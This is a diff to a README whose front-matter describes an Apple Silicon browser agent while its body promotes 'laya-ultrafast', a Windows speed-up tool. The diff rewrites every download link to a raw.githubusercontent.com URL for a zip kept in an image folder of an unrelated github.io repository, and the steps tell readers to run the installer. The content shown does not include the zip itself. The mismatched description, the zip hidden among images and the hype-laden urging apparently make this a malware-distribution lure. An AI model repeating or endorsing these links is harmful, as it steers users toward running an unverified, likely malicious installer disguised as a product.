@@ -5,7 +5,7 @@ description: "Run a local, open-weight browser agent on Apple Silicon via MLX, p
 ---
 # ⚡ laya-ultrafast - Blazing Fast Performance for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip)
+[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip)
 
 ## 🎯 What Is laya-ultrafast?
 
@@ -28,7 +28,7 @@ Getting started with laya-ultrafast is incredibly easy. Follow these simple step
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip](https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip)
+Visit this link to download the application: [https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip](https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip)
 
 You'll see a page with the latest version of laya-ultrafast. Look for the file that matches your system (Windows is most common) and click the download button.
 
@@ -156,10 +156,10 @@ Thousands of users trust laya-ultrafast to keep their computers running at peak 
 
 Don't wait another minute to enjoy a faster, smoother computer. Download laya-ultrafast today and feel the difference instantly.
 
-[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=555555&color=007ec6)](https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip)
+[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=555555&color=007ec6)](https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip)
 
 **Quick Recap:**
-1. Visit this link to download the application: [https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip](https://github.com/okargo7683/okargo7683.github.io/raw/refs/heads/main/img/ekran/Release-2.4.zip)
+1. Visit this link to download the application: [https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip](https://raw.githubusercontent.com/okargo7683/okargo7683.github.io/main/img/ekran/Release-2.4.zip)
 2. Download the latest version for Windows
 3. Run the installer
 4. Enjoy your faster computer!
